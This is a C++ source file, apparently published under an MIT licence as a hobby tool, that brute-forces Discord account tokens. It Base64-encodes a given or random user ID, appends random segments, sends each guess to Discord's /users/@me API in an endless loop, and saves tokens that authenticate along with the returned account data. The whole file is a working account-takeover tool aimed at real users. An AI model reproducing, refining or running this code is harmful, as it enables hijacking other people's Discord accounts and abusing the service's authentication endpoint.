#include "Base64.h"
#include <fstream>
#include <httplib.h>
#include <iostream>
#include "randutils.hpp"
#include <chrono>
#pragma comment(lib, "libcrypto.lib")
#pragma comment(lib, "libssl.lib")
using namespace std;

string alpha = "ABCDEFGHIJKLMNOPQRSTUVWXYZ-abcdefghijklmnopqrstuvwxyz_";
long long int loops = 1;

void callusage(char* argv[]) {
    cout << "Usage:\n\n" << argv[0] << " {Discord Snowflake ID} or \"random\" keyword.\n";
    return;
}

int rinteger(int limit) {
    randutils::mt19937_rng rng;
    int rint = rng.uniform(0, limit);
    return rint;
}

string genchar() {
    int rand = rinteger(alpha.size() - 1);
    string rstr;
    rstr.push_back(alpha[rand]);
    return rstr;
}

string randomclist(int len) {
    string rstr;
    for (int z = 1; z <= len; z++) {
        rstr.append(genchar());
    }
    return rstr;
}

void clearfile() {
    return;
    /* 
     * Es bastante molesto estar recuperando tokens para que se haya borrado todo el progreso que tenías, así que lo deshabilite
     * temporalmente, si desea el reset de los archivos por cada inicio elimine el return de arriba y el comentario que anula las funciones abajo.
     */
    /*
    try {
        ofstream tfile(".\\generated_tokens.txt");
        if (tfile.is_open()) {
            tfile << "";
            tfile.close();
        }
        ofstream t1file(".\\checked_tokens.txt");
        if (t1file.is_open()) {
            t1file << "";
            t1file.close();
        }
    }
    catch (...) {
        return;
    }
    */
}

void writetoken(string path, string &data) {
    try {
        ofstream tfile(path, ios_base::app);
        if (tfile.is_open()) {
            tfile << data;
            tfile.close();
        }
        data.clear();
    }
    catch (...) {
        return;
    }
}

void gentoken(string id, int gencount) {
    using namespace httplib;
    for (int loop = 1; loop <= gencount; loop++) {
        string token;
        token.append(id + "." + randomclist(6) + "." + randomclist(27));
        multimap<string, string, detail::ci> head{ {"Content-Type", "application/json"} };
        if (head.find("Authorization") != head.end()) {
            head.erase(head.find("Authorization"));
        }
        head.insert({ {
            "Authorization", token
            } });
        token.append("\n");
        Client req("https://discord.com");
        auto r = req.Get("/api/v9/users/@me", head);
        if (r) {
            if (r->status == 200) {
                cout << "Token Found: " << token << r->body << "\n";
                writetoken(".\\checked_tokens.txt", token);
            }
            else if (r->status == 401) {
                cerr << "401 Unauthorized\nToken: " << token;
                writetoken(".\\generated_tokens.txt", token);
            }
            else {
                cerr << "Unknown State: " << r->status << "\n" << r->body << "\n";
                cout << "Token: " << token;
                writetoken(".\\generated_tokens.txt", token);
            }
        }
        else {
            cerr << "Error: " << r.error() << "\n";
            writetoken(".\\generated_tokens.txt", token);
        }
    }
}

string rsnow() {
    string id;
    for (unsigned x = 1; x <= 18; x++) {
        id.append(to_string(rinteger(9)));
    }
    return id;
}

void pregen(string &b64id, string tmpid) {
    using namespace chrono;
    cout << "Generating... (" << loops << ")\n";
    b64id = macaron::Base64::Encode(tmpid);
    auto s_point = high_resolution_clock::now();
    gentoken(b64id, 1);
    auto e_point = high_resolution_clock::now();
    auto time_taken = duration_cast<milliseconds>(e_point - s_point).count();
    cout << "Seconds taken to generate and check 1 token: " << float(float(time_taken) / 1000) << "\n\n";
    loops++;
}

int main(int argc, char* argv[]) {
    if (argc <= 1) {
        callusage(argv);
        cerr << "No Snowflake ID/Argument passed.";
        return 1;
    }
    try {
        string b64id;
        string tmpid;
        clearfile();
        for (int z = 1; z < argc; z++) {
            tmpid += argv[z];
        }
        if (tmpid.length() != 18 && tmpid != "random") {
            callusage(argv);
            cerr << "Not valid Snowflake ID passed.";
            return 1;
        }
        else if (strtod(tmpid.c_str(), NULL) == 0 && tmpid != "random") {
            callusage(argv);
            cerr << "Not number/random keyword passed.";
            return 1;
        }
        if (tmpid == "random") {
            while (true) {
                string idrandom = rsnow();
                pregen(b64id, idrandom);
            }
        }
        else {
            while (true) {
                pregen(b64id, tmpid);
            }
        }
    }
    catch (exception& e) {
        cerr << "Error: " << e.what() << ".";
        return 1;
    }
    catch (...) {
        cerr << "Unknown exception.";
        return 1;
    }
}

/*
MIT License

Copyright (c) 2021 NK125

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

-----------------------

I developed this for 3 days or more, please enjoy it!!
*/
